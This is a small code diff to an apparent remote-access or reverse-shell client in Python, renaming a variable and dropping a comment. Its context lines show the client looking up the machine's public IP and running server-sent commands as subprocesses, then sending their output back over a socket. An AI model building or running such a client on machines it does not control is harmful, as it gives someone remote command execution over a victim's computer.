@@ -31,8 +31,8 @@ while True:
     elif server_cmd_s == "r.ip":
         try:
             r = urllib.request.urlopen("https://api.ipify.org/").read().decode("utf-8")
-            wan_public_ip = f"[+] client wan/public ip address: {r}"
-            client_response = bytes(wan_public_ip, "utf-8")
+            public_ip = f"[+] client public ip address: {r}"
+            client_response = bytes(public_ip, "utf-8")
         except:
             continue
     else:
@@ -46,6 +46,6 @@ while True:
         )
         client_stdout = client_cmd.stdout.read()
         client_stderr = client_cmd.stderr.read()
-        client_response = client_stdout + client_stderr  # both are already in bytes
+        client_response = client_stdout + client_stderr 
 
     s.send(client_response)
